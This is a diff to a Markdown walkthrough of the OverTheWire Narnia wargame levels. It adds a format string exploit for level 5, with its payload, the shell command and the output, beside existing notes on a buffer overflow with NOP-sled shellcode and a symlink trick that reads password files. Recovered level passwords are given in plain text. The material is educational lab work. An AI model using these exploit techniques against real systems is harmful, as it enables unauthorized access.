@@ -66,7 +66,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x42424242 in ?? ()                         <- the four 'B' override the return address
 ```
 Now lets create the payload, it will be in this format:  
-(A series of NOP instructions(0x90)) (Shellcode) (Overridden return address)  
+`(A series of NOP instructions(0x90)) (Shellcode) (Overridden return address)`  
 the return address will jump to address just before the shellcode.  
 I use the [same](http://shell-storm.org/shellcode/files/shellcode-811.php) shellcode(25 bytes) as in the previous level.  
 We just need to know the address before the shellcode:  
@@ -111,9 +111,9 @@ vaequeezee
 ### level 3 -> 4
 Their is unsafe copy from argv[1] to ifile, so we can overflow and get into ofile  
 We need to give the program path that serve as somthing we want to read and also serve as payload that pushed to 'ofile' and serve as output file we can read. The path will be in this format:  
-'/tmp/(some padding)/tmp/result'  
-'/tmp/result' will serve as output file and '/tmp/(padding)/tmp/result' as link to password (/etc/narnia_pass/narnia4)  
-Therefore the program will read all data from '/tmp/<padding>/tmp/result and insead of write it to /dev/null he will write it to '/tmp/result' and we can read it.  
+`/tmp/(some padding)/tmp/result`  
+`/tmp/result` will serve as output file and `/tmp/(padding)/tmp/result` as link to password (`/etc/narnia_pass/narnia4`)  
+Therefore the program will read all data from `/tmp/<padding>/tmp/result` and insead of write it to /dev/null he will write it to `/tmp/result and we can read it.  
 I create [this](https://gist.github.com/bom2013/919a78a2dcb44689d37587bedb43be49) script in some folder inside /tmp/ and run it
 ```shell
 narnia3@narnia:/tmp/qwert$ ./solve.sh
@@ -141,9 +141,36 @@ faimahchiy
 faimahchiy
 
 ### level 5 -> 6
-
+There is unsafe use of snprintf(use without string format):
+```c
+snprintf(buffer, sizeof buffer, argv[1]);
+```
+this makes the program vulnerable to a [string format attack](https://owasp.org/www-community/attacks/Format_string_attack).  
+Let's try to use string format to make sure the code is vulnerable to this attack:  
+```shell
+narnia5@narnia:/narnia$ ./narnia5 %x
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [f7fc5000] (8)
+i = 1 (0xffffd6e0)
+```
+Ok, it's vulnerable, now lets create the exploit.  
+(I use [this](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf) wonderful paper to learn about this type of attack and to create the exploit)  
+We want to use some string format that will allow us to change the value of 'i', the string will be in this format:  
+`(address of i)(some padding to extend the string size to 500)('%n' to write 500 to the address)`  
+the actual implementation is:  
+1. Address of 'i' - `\xe0\xd6\xff\xff`
+2. Padding - `%496x`
+3. Write character - `%1$n`  (I use the [parameter field](https://en.wikipedia.org/wiki/Printf_format_string#Format_placeholder_specification) (`1$`) to specifie the parameter to write to (the address of i), without this the `%x` will use the address and the %n will not have it)  
+  
+Lets use this:  
+```shell
+narnia5@narnia:/narnia$ ./narnia5 $(python -c "print('\xe0\xd6\xff\xff')")%496x%1\$n
+Change i's value from 1 -> 500. GOOD
+$ cat /etc/narnia_pass/narnia6
+neezocaeng
+```
 **password:**
-
+neezocaeng
 
 ### level 6 -> 7
 
